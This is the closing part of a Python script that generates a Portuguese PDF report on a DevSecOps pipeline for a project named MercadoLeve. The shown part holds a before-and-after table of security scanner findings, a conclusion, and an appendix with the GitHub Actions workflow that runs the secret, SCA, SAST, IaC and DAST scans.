        ["Gitleaks (segredos)", "6", "0 novos", "Gate no CI; rotação + filter-repo pendentes do histórico"],
        ["pip-audit (CVEs)", "51", "18", "Residuais com CVE pós-baseline ou presos por compatibilidade"],
        ["Trivy SCA (CVEs)", "36", "—", "1 crítica (python-jose) eliminada"],
        ["Bandit (SAST)", "8", "4", "Remanescentes são falsos positivos (whitelist)"],
        ["Semgrep (SAST)", "7", "1", "Remanescente é falso positivo (text + whitelist)"],
        ["Checkov (IaC)", "54", "14", "Remanescentes: boas práticas de baixa prioridade"],
        ["Trivy config (IaC)", "28", "3", "Remanescentes: risco aceito (egress) / CMK"],
        ["OWASP ZAP (DAST)", "1 Alto (SQLi)", "0 Alto", "SQLi reclassificada como PASS; WARN 8->4"],
    ],
    [40, 22, 22, 96],
    aligns=["L", "C", "C", "L"],
    caption="Tabela 5 — Comparativo antes e depois da remediação",
)
pdf.ch2("6.2", "Conclusão")
pdf.body(
    "O projeto demonstrou, de ponta a ponta, uma esteira DevSecOps funcional cobrindo as "
    "cinco análises exigidas sobre um sistema com lógica de negócio e superfície de "
    "ataque reais. Mais do que coletar saídas, o trabalho exercitou a interpretação "
    "crítica: separar 6 segredos reais de uma chave de exemplo legítima; reconhecer que "
    "f-strings com whitelist são falsos positivos do SAST; entender que CVEs residuais "
    "de SCA são um alvo móvel de gestão de risco; e perceber que a severidade CRITICAL "
    "de um egress aberto pode ser um risco aceito conscientemente.")
pdf.body(
    "As principais lições foram a complementaridade das técnicas — o DAST confirmou a "
    "injeção de SQL de forma black-box, enquanto o SAST foi essencial para as falhas "
    "autenticadas (RCE, injeção de comando) que o DAST não autenticado não alcançou — e "
    "a importância de validar achados com prova de exploração antes de priorizar a "
    "correção. Todas as vulnerabilidades de médio ou maior risco foram corrigidas e "
    "revalidadas, com redução expressiva e justificada do ruído remanescente.")

# ===========================================================================
# APÊNDICE A
# ===========================================================================
pdf.add_page()
pdf.ch1("A", "Apêndice A — Workflow de CI/CD (GitHub Actions)")
pdf.body(
    "Arquivo .github/workflows/devsecops.yml (trecho principal; versão completa no "
    "repositório). As ferramentas foram também executadas localmente para a coleta de "
    "evidências: Gitleaks e Trivy (Homebrew), pip-audit, Semgrep, Bandit e Checkov "
    "(ambiente virtual Python) e OWASP ZAP (contêiner Docker) contra a API em execução. "
    "Os artefatos resultantes estão em security-reports/.")
pdf.code(
    "name: DevSecOps Pipeline\n"
    "on: { push: { branches: [main, develop] }, pull_request: { branches: [main] } }\n"
    "permissions: { contents: read, security-events: write }\n"
    "jobs:\n"
    "  secret-detection:                      # 1) SECRET DETECTION\n"
    "    runs-on: ubuntu-latest\n"
    "    steps:\n"
    "      - uses: actions/checkout@v4\n"
    "        with: { fetch-depth: 0 }         # historico completo\n"
    "      - uses: gitleaks/gitleaks-action@v2\n"
    "  sca:                                   # 2) SCA\n"
    "    steps:\n"
    "      - run: pip install pip-audit && pip-audit -r requirements.txt --desc\n"
    "      - uses: aquasecurity/trivy-action@0.24.0\n"
    "        with: { scan-type: fs, scanners: vuln, format: sarif, output: trivy-sca.sarif }\n"
    "  sast:                                  # 3) SAST\n"
    "    steps:\n"
    "      - run: semgrep scan --config=p/python --config=p/security-audit --sarif -o semgrep.sarif app/\n"
    "      - run: bandit -r app/\n"
    "  iac-scan:                              # 4) IaC\n"
    "    steps:\n"
    "      - uses: bridgecrewio/checkov-action@v12\n"
    "        with: { framework: 'dockerfile,terraform,kubernetes' }\n"
    "      - uses: aquasecurity/trivy-action@0.24.0\n"
    "        with: { scan-type: config }\n"
    "  dast:                                  # 5) DAST\n"
    "    needs: [sast, sca]\n"
    "    steps:\n"
    "      - run: docker compose up -d --build   # sobe a API + Postgres\n"
    "      - uses: zaproxy/action-baseline@v0.12.0\n"
    "        with: { target: 'http://localhost:8000' }",
    caption="devsecops.yml — os cinco jobs obrigatórios",
)

OUT = "Relatorio_DevSecOps_MercadoLeve.pdf"
pdf.output(OUT)
print("PDF gerado:", OUT)
